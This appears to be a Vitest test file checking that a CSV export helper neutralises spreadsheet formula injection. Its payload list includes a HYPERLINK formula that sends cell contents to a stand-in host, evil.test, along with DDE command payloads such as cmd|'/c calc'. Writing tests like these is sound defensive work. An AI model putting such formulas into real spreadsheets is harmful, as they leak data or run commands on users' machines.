import { describe, it, expect } from "vitest";
import { csvCell, toCsv } from "../csv.js";

// What a spreadsheet actually holds after it parses a CSV field — quoting is
// stripped at parse time, so a formula inside quotes still evaluates.
const parseField = (field) =>
  field.startsWith('"') && field.endsWith('"')
    ? field.slice(1, -1).replace(/""/g, '"')
    : field;

const EVALUATES = /^[=+\-@\t\r]/;

const FORMULA_PAYLOADS = [
  '=HYPERLINK("https://evil.test/?d="&A1,"Click me")',
  "=cmd|'/c calc'!A0",
  "+1+1",
  "-2+3+cmd|'/c calc'!A0",
  "@SUM(1+1)*cmd|'/c calc'!A0",
  "\tSUM(A1)",
  "\r=1+1",
];

describe("csvCell formula-injection hardening", () => {
  it.each(FORMULA_PAYLOADS)(
    "neutralizes %j so the spreadsheet treats it as text",
    (payload) => {
      const cellValue = parseField(csvCell(payload));
      expect(cellValue.startsWith("'")).toBe(true);
      expect(EVALUATES.test(cellValue)).toBe(false);
    },
  );

  it("keeps the original text readable after the guard prefix", () => {
    expect(parseField(csvCell("=cmd|'/c calc'!A0"))).toBe("'=cmd|'/c calc'!A0");
  });

  it("still escapes quotes, commas and newlines (RFC 4180)", () => {
    expect(csvCell('say "hi", now')).toBe('"say ""hi"", now"');
    expect(csvCell("line1\nline2")).toBe('"line1\nline2"');
  });

  it("leaves ordinary customer data untouched", () => {
    for (const value of ["Ada Lovelace", "ada@example.com", "12 Marina Rd"]) {
      expect(csvCell(value)).toBe(value);
    }
  });

  it("does not mangle negative numbers (totals and refunds stay numeric)", () => {
    expect(csvCell(-50)).toBe("-50");
    expect(csvCell(-50.25)).toBe("-50.25");
    expect(csvCell("-50")).toBe("-50");
  });

  it("handles null and undefined as empty cells", () => {
    expect(csvCell(null)).toBe("");
    expect(csvCell(undefined)).toBe("");
  });

  it("toCsv protects a malicious name in a real export row", () => {
    const csv = toCsv(
      ["Customer ID", "Name", "Email"],
      [["cus_1", '=HYPERLINK("https://evil.test","x")', "a@b.com"]],
    );
    const nameField = csv.split("\r\n")[1].match(/^cus_1,(.*),a@b\.com$/)[1];
    expect(EVALUATES.test(parseField(nameField))).toBe(false);
  });
});
